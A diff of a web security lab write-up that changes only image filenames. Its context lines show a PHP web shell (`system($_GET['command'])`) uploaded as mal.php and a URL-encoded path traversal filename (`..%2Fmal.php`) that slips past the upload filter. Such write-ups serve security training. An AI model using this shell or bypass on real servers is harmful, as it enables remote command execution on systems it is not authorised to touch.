@@ -10,17 +10,17 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 So, User's page includes avatar upload function. just to upload `mal.php` with contents `<?php echo system($_GET['command']); ?>` will just return plaintext version of this script.
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>calling mal.php from url</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Pasted image 20240720173537.png" alt=""><figcaption><p>calling mal.php from url</p></figcaption></figure>
 
 it also seems that uploading `mal.php` with path traversal `../mal.php` still uploads it to `files/avatars/mal.php`, which means that it's cutting traversals in path.
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>calling mal.php file from API</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Pasted image 20240720173821.png" alt=""><figcaption><p>calling mal.php file from API</p></figcaption></figure>
 
 So all I had to do was obfuscating the path traversal to `..%2Fmal.php` which is same as `../mal.php`.
 
 after changing a filename to this parameter and uploading it we get the following response
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>obfuscated mal.php filename bypassed defense mechanisms</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/uploaded.png" alt=""><figcaption><p>obfuscated mal.php filename bypassed defense mechanisms</p></figcaption></figure>
 
 so the file is uploaded to `files/mal.php`
 
